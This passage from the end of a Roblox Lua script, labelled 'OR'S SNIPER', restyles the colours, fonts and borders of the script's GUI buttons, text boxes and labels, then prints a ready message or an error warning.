                    obj.BackgroundTransparency = math.max(obj.BackgroundTransparency, 0.24)
                end
            elseif obj:IsA("TextButton") then
                obj.AutoButtonColor = false
                obj.BackgroundColor3 = Color3.fromRGB(65, 70, 81)
                obj.BackgroundTransparency = 0.10
                obj.TextColor3 = Color3.fromRGB(250, 251, 253)
                obj.Font = Enum.Font.GothamSemibold
                local corner = obj:FindFirstChildOfClass("UICorner")
                if corner then corner.CornerRadius = UDim.new(0, 9) end
                local stroke = obj:FindFirstChildOfClass("UIStroke")
                if not stroke then
                    stroke = Instance.new("UIStroke")
                    stroke.Parent = obj
                end
                stroke.Color = Color3.fromRGB(205, 211, 222)
                stroke.Thickness = 1
                stroke.Transparency = 0.58
            elseif obj:IsA("TextBox") then
                obj.BackgroundColor3 = Color3.fromRGB(25, 28, 34)
                obj.BackgroundTransparency = 0.08
                obj.TextColor3 = Color3.fromRGB(250, 251, 253)
                obj.Font = Enum.Font.Gotham
                local corner = obj:FindFirstChildOfClass("UICorner")
                if corner then corner.CornerRadius = UDim.new(0, 9) end
            elseif obj:IsA("TextLabel") then
                obj.Font = (obj.Font == Enum.Font.GothamBold) and Enum.Font.GothamBold or Enum.Font.GothamMedium
                if obj.TextColor3 == Color3.fromRGB(165, 168, 175) then
                    obj.TextColor3 = Color3.fromRGB(198, 203, 213)
                end
                obj.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                obj.TextStrokeTransparency = 0.55
            end
        end
    end

    polishInterface(GUI)
    polishInterface(SettingsPopup)
    polishInterface(AAHelperPopup)

    ConsoleOutput.Text = ""
    updateMainStatus()
    task.defer(updateMainStatus)
    task.delay(0.15, updateMainStatus)
    task.delay(0.5, updateMainStatus)

    print("[OR'S SNIPER] GUI ready.")
end)

if not success then
    warn("[OR'S SNIPER] OR'S SNIPER error: " .. tostring(err))
    print("[OR'S SNIPER] The script failed to run - check the error above.")
end